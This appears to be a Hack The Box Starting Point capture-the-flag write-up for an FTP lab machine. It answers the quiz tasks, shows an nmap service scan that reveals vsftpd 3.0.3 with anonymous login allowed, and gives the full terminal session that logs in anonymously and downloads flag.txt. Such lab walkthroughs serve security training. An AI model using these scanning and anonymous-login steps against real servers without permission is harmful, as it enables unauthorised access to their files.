# Task 1
What does the 3-letter acronym FTP stand for? File Transfer Protocol 

# Task 2
What communication model does FTP use, architecturally speaking? client-server model

https://networkencyclopedia.com/file-transfer-protocol-ftp/

#  Task 3
What is the name of one popular GUI FTP program? Filezilla

# Task 4
Which port is the FTP service active on usually? 21 tcp

```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /tier 1]
└─$ nmap -sC -sV 10.129.104.223 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 00:50 PDT
Nmap scan report for 10.129.104.223
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.49
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.99 seconds
``` 

#  Task 5
What acronym is used for the secure version of FTP? SFTP (secure file transfer protocol)

#  Task 6
What is the command we can use to test our connection to the target? Ping

#  Task 7
From your scans, what version is FTP running on the target? vsftpd 3.0.3

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```
#  Task 8
From your scans, what OS type is running on the target? Unix
```bash
Service Info: OS: Unix
```
#  Submit Flag
Submit root flag 
```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /tier 1]
└─$ ftp 10.129.104.223
Connected to 10.129.104.223.
220 (vsFTPd 3.0.3)
Name (10.129.104.223:defalt): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8784|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||26404|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************************************************************************************************|    32       14.95 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.17 KiB/s)
ftp> exit
221 Goodbye.
```